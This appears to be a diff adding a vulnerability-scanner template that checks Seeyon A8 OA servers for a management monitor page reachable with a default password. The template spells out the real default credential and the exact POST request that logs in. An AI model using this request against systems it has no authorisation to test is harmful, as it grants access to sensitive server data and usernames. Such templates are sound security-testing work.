@@ -1,0 +1,28 @@
+id: seeyon-monitor-default-login
+brief:
+    title: Seeyon A8 Management Monitor - Default Login
+    by: SleepingBag945
+    level: high
+    about: Seeyon OA A8-m has status monitoring page information leakage. Attackers can obtain sensitive information such as website paths and user names for further attacks. Attackers can use this vulnerabil...
+    label:
+        - seeyon
+        - oa
+        - default-login
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/seeyon/management/index.jsp'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: password=WLCCYBD%40SEEYON
+      signs:
+        - "on": word
+          has:
+            - <title>A8 Management Monitor</title>
+            - Connection Pooling
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
